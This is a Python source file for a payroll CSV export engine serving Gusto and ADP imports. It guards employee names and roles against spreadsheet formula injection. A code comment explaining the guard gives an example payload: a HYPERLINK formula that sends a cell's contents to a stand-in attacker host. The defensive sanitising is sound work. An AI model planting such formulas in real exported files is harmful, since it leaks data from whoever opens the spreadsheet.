"""Payroll export formatting engine for Gusto, ADP, and standard CSV integrations."""

import csv
import io
from typing import Any, Dict, List

# A cell whose text starts with one of these is a live formula to Excel/Sheets/Numbers
# the moment the file is opened - '=', '+' and '-' start a formula, '@' triggers an
# old-style Lotus/Excel macro, and a leading tab or CR can smuggle a second "cell" past
# naive parsers. An employee name or role is free text a staff member or manager
# chooses, so it must never reach a payroll CSV able to run code or call out to a URL
# (e.g. a name of '=HYPERLINK("http://evil.example/"&A1,"click")') just because someone
# opens the export in a spreadsheet.
_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r")


def _csv_formula_guard(value: str) -> str:
    """Prefixes a leading formula-trigger character with a single quote, which Excel/
    Sheets/Numbers treat as "force text" and never render, so the cell is shown and
    stored as literal text instead of being evaluated."""
    if value.startswith(_FORMULA_TRIGGER_CHARS):
        return "'" + value
    return value


class PayrollExportEngine:
    """Formats calculated labor records into standard payroll provider ingestion formats."""

    @staticmethod
    def export_gusto_csv(
        roster_lines: List[Dict[str, Any]],
        company_name: str = "Your facility",
    ) -> str:
        """Generates Gusto-formatted payroll CSV for 1-click import."""
        output = io.StringIO()
        writer = csv.writer(output, lineterminator="\n")

        # Standard Gusto Import Header
        writer.writerow([
            "Employee ID",
            "Employee Name",
            "Role",
            "Regular Hours",
            "Overtime Hours",
            "Hourly Wage",
            "Gross Pay ($)",
            "Notes",
        ])

        for line in roster_lines:
            line_num = line.get("line_number") or line.get("lineNum") or 1
            emp_id = line.get("assigned_employee_id") or line.get("empId") or f"PATTERN-{line_num:02d}"
            name = line.get("assigned_person") or line.get("empName") or f"Shift Pattern {line_num}"
            role = line.get("qualification_tier") or line.get("role") or "Floor Clerk"
            reg = round(float(line.get("regular_hours", line.get("regHours", 0.0))), 2)
            ot = round(float(line.get("overtime_hours", line.get("otHours", 0.0))), 2)
            wage_raw = line.get("hourly_wage", line.get("wage"))
            gross_raw = line.get("estimated_weekly_payroll", line.get("weeklyPay"))
            wage = "" if wage_raw is None else f"{round(float(wage_raw), 2):.2f}"
            gross = "" if gross_raw is None else f"{round(float(gross_raw), 2):.2f}"

            writer.writerow([
                emp_id,
                _csv_formula_guard(str(name)),
                _csv_formula_guard(str(role)),
                f"{reg:.2f}",
                f"{ot:.2f}",
                wage,
                gross,
                f"ShiftFlow Pattern {line_num}",
            ])

        return output.getvalue()

    @staticmethod
    def export_adp_workforce_csv(
        roster_lines: List[Dict[str, Any]],
        company_code: str = "SF99",
        batch_id: str = "WEEKLY_01",
    ) -> str:
        """Generates ADP Workforce Now-formatted payroll import CSV."""
        output = io.StringIO()
        writer = csv.writer(output, lineterminator="\n")

        # ADP Standard Batch Header
        writer.writerow([
            "Co Code",
            "Batch ID",
            "File #",
            "Employee Name",
            "Reg Hours",
            "O/T Hours",
            "Hourly Rate",
            "Shift Pay Code",
            "Gross Amount",
        ])

        for line in roster_lines:
            line_num = line.get("line_number") or line.get("lineNum") or 1
            emp_id = line.get("assigned_employee_id") or line.get("empId") or f"L{line_num:02d}"
            name = line.get("assigned_person") or line.get("empName") or f"Associate {line_num}"
            reg = round(float(line.get("regular_hours", line.get("regHours", 0.0))), 2)
            ot = round(float(line.get("overtime_hours", line.get("otHours", 0.0))), 2)
            wage_raw = line.get("hourly_wage", line.get("wage"))
            gross_raw = line.get("estimated_weekly_payroll", line.get("weeklyPay"))
            wage = "" if wage_raw is None else f"{round(float(wage_raw), 2):.2f}"
            gross = "" if gross_raw is None else f"{round(float(gross_raw), 2):.2f}"

            writer.writerow([
                company_code,
                batch_id,
                emp_id,
                _csv_formula_guard(str(name)),
                f"{reg:.2f}",
                f"{ot:.2f}",
                wage,
                "REG",
                gross,
            ])

        return output.getvalue()
